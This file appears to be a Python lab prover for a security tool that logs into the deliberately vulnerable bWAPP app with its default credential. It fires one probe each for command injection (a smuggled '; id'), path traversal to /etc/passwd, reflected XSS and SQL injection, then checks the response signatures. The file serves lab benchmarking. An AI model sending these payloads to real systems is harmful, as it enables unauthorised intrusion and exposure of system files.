"""
bWAPP lab prover -- deterministic, oracle-confirmed proof that Apolaki's GENERALIZED techniques fire on an
independent second/third lab (the >=2-lab bar in the Taxonomy tab). bWAPP has no scoreboard API, so the
oracle is the vulnerability's RESPONSE signature, not a solved-flag. One precise request per class; reports
which oracles fired.

Guardrails: logs in with the single well-known bWAPP credential (bee/bug) at low security -- no brute-force
loop, no DoS. Zero-token, deterministic. Used to cross-validate techniques and as a benchmark fixture.
"""
from __future__ import annotations

import re

# class -> (method, path, query params, form data, response-signature oracle)
_PROBES = [
    ("command_injection", "POST", "/commandi.php", None, {"target": "127.0.0.1; id", "form": "submit"},
     r"uid=\d+\("),                                          # `; id` executed -> uid=NNN(name)
    ("path_traversal", "GET", "/directory_traversal_1.php", {"page": "../../../../../../etc/passwd"}, None,
     r"root:.*:0:0:"),                                       # /etc/passwd contents rendered
    ("reflected_xss", "GET", "/xss_get.php",
     {"firstname": "<script>alert(1)</script>", "lastname": "z", "form": "submit"}, None,
     r"<script>alert\(1\)</script>"),                        # payload reflected verbatim (unescaped)
    ("sqli", "GET", "/sqli_1.php", {"title": "iron'", "action": "search"}, None,
     r"(?i)error in your SQL syntax|mysql_fetch|mysqli"),    # single quote reaches the SQL parser (error-based)
]


def prove(base_url: str) -> dict:
    """Log in to bWAPP and confirm each generalized technique via its response oracle. Returns which
    classes fired. Never raises; degrades to an error dict when httpx/the target is unavailable."""
    try:
        import httpx
    except Exception:
        return {"lab": "bwapp", "error": "httpx unavailable"}
    base = base_url.rstrip("/")
    out = {"lab": "bwapp", "confirmed": [], "probes": {}}
    try:
        c = httpx.Client(base_url=base, timeout=15, follow_redirects=True,
                         headers={"User-Agent": "apolaki-labmode"})
    except Exception as e:
        return {"lab": "bwapp", "error": str(e)}
    try:
        # single known credential + low security (NOT a brute-force loop)
        c.get("/login.php")
        c.post("/login.php", data={"login": "bee", "password": "bug", "security_level": "0", "form": "submit"})
        for cls, method, path, params, data, sig in _PROBES:
            fired = False
            try:
                r = c.get(path, params=params) if method == "GET" else c.post(path, data=data)
                fired = bool(re.search(sig, r.text))
            except Exception:
                pass
            out["probes"][cls] = fired
            if fired:
                out["confirmed"].append(cls)
        out["confirmed"] = sorted(set(out["confirmed"]))
        return out
    except Exception as e:
        out["error"] = str(e)
        return out
    finally:
        c.close()


# Which registry techniques a fired bWAPP class cross-validates (feeds validated_on / the generalized bar).
CLASS_TO_TECHNIQUES = {
    "command_injection": ["command_injection"],
    "path_traversal": ["path_traversal"],
    "reflected_xss": ["reflected_xss"],
    "sqli": ["sqli_auth_bypass"],
}
